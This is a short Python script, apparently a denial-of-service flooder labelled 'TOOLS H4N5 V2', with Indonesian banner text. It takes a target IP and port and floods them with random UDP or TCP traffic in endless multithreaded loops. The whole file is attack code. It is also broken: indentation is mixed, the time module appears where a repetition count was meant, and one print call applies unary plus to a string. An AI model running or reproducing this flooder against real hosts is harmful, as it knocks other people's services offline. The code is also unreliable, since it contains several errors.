#coddbyZarier
import socket
import random
import threading
import time
import os , sys

print ("TOOLS H4N5 V2")
print ("TIDAK MENJAMIN TEMBUS DI SERVER BESAR/BER ANTI DDOS.")
print ("DONT ABUSE BROTHER!!")

ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" Ready?? y/n :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("clear")
def udp():
    data = random._urandom(65503)
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(time):
                    s.sendto(data,addr)
			print(+"\033[91m  ATTACK %s \\033[91m PORT %s"%(ip,port))
		except:
			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
			
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'n':
        th = threading.Thread(target = tcp)
        th.start()